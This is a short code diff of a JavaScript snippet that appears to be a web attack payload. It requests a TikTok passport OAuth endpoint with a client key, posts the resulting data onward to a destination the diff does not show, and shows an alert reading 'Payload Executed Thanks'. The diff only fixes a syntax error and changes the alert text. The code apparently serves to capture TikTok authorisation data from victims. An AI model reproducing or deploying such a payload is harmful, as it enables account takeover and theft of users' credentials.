@@ -16,6 +16,6 @@ fetch("https://www.tiktok.com/passport/open/web/auth/v2/?client_key=723649340764
       body: JSON.stringify(data),
     });
   })
-  .catch(error => console.error('Error:', error));,
-  alert("Payload Executed Thanks")
+  .catch(error => console.error('Error:', error));
+  alert("Payload Executed Thankss")
   
